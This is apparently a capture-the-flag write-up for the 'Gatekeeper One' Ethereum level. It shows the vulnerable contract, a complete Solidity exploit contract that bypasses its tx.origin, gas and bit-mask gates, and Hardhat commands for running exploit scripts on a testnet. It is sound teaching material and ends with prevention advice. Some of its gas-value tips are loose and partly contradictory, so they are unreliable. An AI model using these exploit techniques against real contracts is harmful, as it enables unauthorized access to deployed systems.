# Level 13: Gatekeeper One Challenge

## Challenge Description

This level introduces a contract with multiple "gates" that must be passed to become an "entrant". It combines concepts of gas manipulation, contract proxies, and bitwise operations to create a challenge that tests your understanding of Ethereum's lower-level mechanics.

## Contract Location

The challenge contract is located at:
```
/contracts/level-13-gatekeeper-1/GatekeeperOne.sol
```

## Understanding the Challenge

The `GatekeeperOne` contract has three gates (implemented as modifiers) that must be passed to call the `enter` function and become the entrant. Here's the contract:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract GatekeeperOne {
    address public entrant;

    modifier gateOne() {
        require(msg.sender != tx.origin);
        _;
    }

    modifier gateTwo() {
        require(gasleft() % 8191 == 0);
        _;
    }

    modifier gateThree(bytes8 _gateKey) {
        require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
        require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
        require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), "GatekeeperOne: invalid gateThree part three");
        _;
    }

    function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
        entrant = tx.origin;
        return true;
    }
}
```

### The Gates

To become the entrant, you must pass all three gates:

1. **Gate One**: `require(msg.sender != tx.origin)`
   - This requires that the function call is not made directly by an externally owned account (EOA), but through another contract

2. **Gate Two**: `require(gasleft() % 8191 == 0)`
   - This requires that the amount of gas remaining at this point in the execution is divisible by 8191
   - You need precise control over the gas sent in the transaction

3. **Gate Three**: Three conditions on the `_gateKey` parameter:
   - `uint32(uint64(_gateKey)) == uint16(uint64(_gateKey))`
   - `uint32(uint64(_gateKey)) != uint64(_gateKey)`
   - `uint32(uint64(_gateKey)) == uint16(uint160(tx.origin))`

## Winning Strategy

To pass all gates, you need to:

1. Create an intermediary contract that will call the GatekeeperOne contract (for Gate One)
2. Find the correct gas amount to send with your transaction (for Gate Two)
3. Craft a special `bytes8` key that meets all three conditions of Gate Three

## Hint for Thinking

Ask yourself:
* How can you use an intermediary contract to bypass Gate One?
* How can you determine the exact gas needed to make `gasleft() % 8191 == 0`?
* How do type conversions in Solidity work with masking operations?
* How can you use bitwise operations to craft a key that meets all requirements in Gate Three?

## Disclaimer

If you want to solve this challenge on your own, stop reading here and try to implement a solution based on the hints above. The complete solution is provided below.

---

## Solution

The solution involves creating an exploit contract that can bypass all three gates.

### Gate One Solution

Gate One requires `msg.sender != tx.origin`. This is straightforward to bypass by using a contract to make the call. When a contract calls another contract, `msg.sender` is the address of the calling contract, while `tx.origin` is the address of the account that initiated the transaction.

### Gate Two Solution

Gate Two requires `gasleft() % 8191 == 0`. This is the trickiest part of the challenge because the gas consumption up to that point depends on many factors including:

- The exact compiler version used
- The optimization level
- The way the contract is deployed
- The specific blockchain network

There are several approaches to solving this:

#### 1. Common Offset Method (Most Reliable)

The most reliable approach is to use a gas value that equals a multiple of 8191 plus a specific offset. The offset compensates for the gas consumed before the check happens.

Common working offsets include:
- 254-260 (very common across environments)
- 200-230 (works in some environments)
- 100-120 (works in other environments)

Example: `81910 + 254 = 82164` (where 81910 is 8191 × 10)

#### 2. Specific Value Ranges

Certain gas value ranges tend to work more often:
- Values between 24500-25000
- Values between 81910-82200

#### 3. Systematic Testing

Systematically test values with small increments around known working values.

Our `simple-exploit.ts` script uses a combination of these approaches and has been confirmed to work reliably.

### Gate Three Solution

Gate Three has three requirements for the `bytes8 _gateKey`:

1. `uint32(uint64(_gateKey)) == uint16(uint64(_gateKey))`
2. `uint32(uint64(_gateKey)) != uint64(_gateKey)`
3. `uint32(uint64(_gateKey)) == uint16(uint160(tx.origin))`

Breaking down these requirements in terms of bit patterns:

1. **First condition**: The lower 32 bits (4 bytes) must match the lower 16 bits (2 bytes) when cast. This means bytes 2-3 (counting from 0) must be zero (0x00000000).

2. **Second condition**: The full 64-bit value must be different from the 32-bit value. This means at least one bit in bytes 4-7 must be non-zero.

3. **Third condition**: The lower 32 bits must equal the lower 16 bits of the caller's address. This means the lowest 2 bytes must match the last 2 bytes of tx.origin.

Combining all these requirements, we need a key where:
- The lowest 2 bytes match the last 2 bytes of tx.origin (from condition 3)
- Bytes 2-3 are all zeros (from condition 1)
- At least one bit in bytes 4-7 is set to 1 (from condition 2)

The solution is implemented in both exploit contracts with slightly different approaches:

```solidity
// In GatekeeperOneExploit.sol
uint16 addressLast2Bytes = uint16(uint160(_origin));
uint64 key = uint64(addressLast2Bytes) | 0x1000000000000000;

// In AlternateExploit.sol
bytes8 key = bytes8(uint64(uint16(uint160(tx.origin))) | 0x1000000000000000);
```

Both implementations:
- Take the last 2 bytes of the tx.origin address
- Set bytes 2-3 to zero
- Set a bit in the highest byte to ensure condition 2 is met

This approach works reliably across all environments.

### Exploit Contract

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IGatekeeperOne {
    function enter(bytes8 _gateKey) external returns (bool);
    function entrant() external view returns (address);
}

contract GatekeeperOneExploit {
    address public owner;
    address public gatekeeperAddress;
    bool public success;
    uint256 public gasToUse;
    
    constructor(address _gatekeeperAddress) {
        owner = msg.sender;
        gatekeeperAddress = _gatekeeperAddress;
    }
    
    function generateGateKey(address _origin) public pure returns (bytes8) {
        // We need to craft a key that meets three conditions:
        // 1. uint32(uint64(key)) == uint16(uint64(key))
        //    This means the lower 2 bytes must match when converting to uint16 and uint32
        //    So bytes 2-3 must be 0
        //
        // 2. uint32(uint64(key)) != uint64(key)
        //    This means at least some bits in bytes 4-7 must be non-zero
        //
        // 3. uint32(uint64(key)) == uint16(uint160(tx.origin))
        //    This means the lower 2 bytes must match the lower 2 bytes of tx.origin
        
        // Extract the last 2 bytes (16 bits) of the address
        uint16 addressPart = uint16(uint160(_origin));
        
        // For condition 1 and 3: Create a key where the lower 16 bits are the address bits
        // and bytes 2-3 are zeros
        uint64 key = uint64(addressPart);
        
        // For condition 2: Make sure bytes 4-7 have some non-zero bits
        // We'll set them all to 1s
        key = key | (uint64(0xFFFFFFFF00000000));
        
        return bytes8(key);
    }
    
    function enterGate(uint256 _gasToUse) external {
        require(msg.sender == owner, "Only owner can call");
        gasToUse = _gasToUse;
        
        // Generate the gate key based on tx.origin (the original caller)
        bytes8 gateKey = generateGateKey(tx.origin);
        
        // Call the enter function with the specified gas
        // Make sure we have a high enough gas limit for the overall transaction
        // but control the gas sent to the target contract
        bool result = IGatekeeperOne(gatekeeperAddress).enter{gas: _gasToUse}(gateKey);
        
        success = result;
    }
    
    function checkSuccess() external view returns (bool) {
        address entrant = IGatekeeperOne(gatekeeperAddress).entrant();
        return entrant == tx.origin;
    }
}
```

## Step-by-Step Solution Guide

We've provided multiple approaches to solve this challenge because finding the correct gas value can be tricky and environment-dependent. The recommended approach is the `simple-exploit.ts` script which has been confirmed to work reliably.

### Option 1: Simple Exploit Approach (Recommended)

This is the simplest and most reliable approach that works across different environments.

1. **Deploy the GatekeeperOneExploit Contract**

   ```shell
   # Deploy the original exploit contract
   npx hardhat deploy --tags gatekeeper-one-solution --network sepolia
   # Or with a specific target address
   TARGET_ADDRESS=0xYourGatekeeperOneAddress npx hardhat deploy --tags gatekeeper-one-solution --network sepolia
   ```

2. **Execute the Simple Exploit Script**

   ```shell
   # Run the simple exploit script that focuses on proven gas offsets
   EXPLOIT_ADDRESS=0xYourExploitAddress npx hardhat run scripts/level-13-gatekeeper-1/simple-exploit.ts --network sepolia
   ```

   This script systematically tries gas values with offsets that have proven to work across various environments.

### Option 2: Alternate Exploit Contract

If the first option doesn't work, try this alternative approach that uses assembly for more precise gas control:

1. **Deploy the AlternateExploit Contract**

   ```shell
   npx hardhat deploy --tags alternate-exploit --network sepolia
   ```

2. **Execute the Alternate Exploit Script**

   ```shell
   EXPLOIT_ADDRESS=0xYourAlternateExploitAddress TARGET_ADDRESS=0xGatekeeperOneAddress npx hardhat run scripts/level-13-gatekeeper-1/alternate-exploit.ts --network sepolia
   ```

### Option 3: Direct Approach with Specific Gas Value

If you know a specific gas value that might work:

```shell
EXPLOIT_ADDRESS=0xYourExploitAddress SPECIFIC_GAS=81910 npx hardhat run scripts/level-13-gatekeeper-1/direct-exploit.ts --network sepolia
```

### Option 4: Find Gas Offset

For a more methodical search of gas values:

```shell
EXPLOIT_ADDRESS=0xYourExploitAddress BASE=81910 STEP=1 RANGE=300 npx hardhat run scripts/level-13-gatekeeper-1/find-gas-offset.ts --network sepolia
```

### Option 5: Original Exploit Script

The original exploit approach, which may require more adjustments:

```shell
EXPLOIT_ADDRESS=0xYourExploitAddress TARGET_ADDRESS=0xTargetAddress npx hardhat run scripts/level-13-gatekeeper-1/execute-gatekeeper-one-exploit.ts --network sepolia
```

### Gas Values and Gate Keys

Finding the correct gas value can be challenging due to variations in environment, compiler versions, and network conditions. Here are some tips:

1. **Common Working Gas Values**:
   - Values with offset 254-260 from multiples of 8191 (e.g., 81910 + 254)
   - Values around 24500-25000
   - Exact multiples of 8191

2. **Gate Key Formation**:
   - The gate key needs to satisfy three conditions in `gateThree`
   - The key is derived from your address (tx.origin)
   - Both exploit contracts implement proper key generation logic

### Verify Your Success

After executing any of the solutions, verify that the `entrant` variable in the GatekeeperOne contract is set to your address. All the scripts will check this automatically and report success.

## Available Scripts

For this challenge, we've provided multiple scripts to help you find the right solution:

1. **simple-exploit.ts** (RECOMMENDED):
   - The most reliable script that focuses on proven gas values
   - Uses a systematic approach to try common working offsets

2. **alternate-exploit.ts**:
   - Works with the AlternateExploit contract for more precise gas control
   - Uses assembly for direct control over gas usage

3. **direct-exploit.ts**:
   - For trying a specific gas value directly
   - Useful when you have a gas value that works in your environment

4. **find-gas-offset.ts**:
   - Systematic search for working gas values with configurable parameters
   - Provides detailed analysis of attempts

5. **calibrate-gas.ts**:
   - Helps estimate gas consumption and calculate possible working values
   - Useful for understanding gas usage patterns

6. **execute-gatekeeper-one-exploit.ts**:
   - The original exploit script with a variety of gas values
   - More general purpose approach

## Lessons Learned

This challenge teaches important lessons about Ethereum's internals:

1. **Transaction Origin vs. Message Sender**: Understanding the distinction between `tx.origin` and `msg.sender` is crucial for contract security.

2. **Gas Manipulation**: Gas management in Ethereum is complex, and contracts that depend on specific gas amounts can be vulnerable to exploitation.

3. **Type Conversions**: Solidity's type conversion rules can create subtle bugs or vulnerabilities when not fully understood.

4. **Bitwise Operations**: Mastering bitwise operations is essential for solving complex challenges in smart contracts.

5. **Contract-to-Contract Interaction**: The ability to call contracts from other contracts creates powerful composition but also potential security risks.

## Prevention Strategies

To avoid similar vulnerabilities in your contracts:

1. **Avoid `tx.origin` for Authorization**: Never use `tx.origin` for authorization checks; prefer `msg.sender`.

2. **Don't Rely on Specific Gas Values**: Avoid making contract logic dependent on specific gas amounts, as these can change with protocol upgrades.

3. **Be Careful with Type Conversions**: When working with type conversions, be explicit about your intentions and test edge cases.

4. **Protect Against Intermediary Contracts**: Consider whether your contract could be exploited through an intermediary contract.

5. **Rigorous Testing**: Complex contracts with multiple checks require thorough testing, including fuzzing and formal verification.
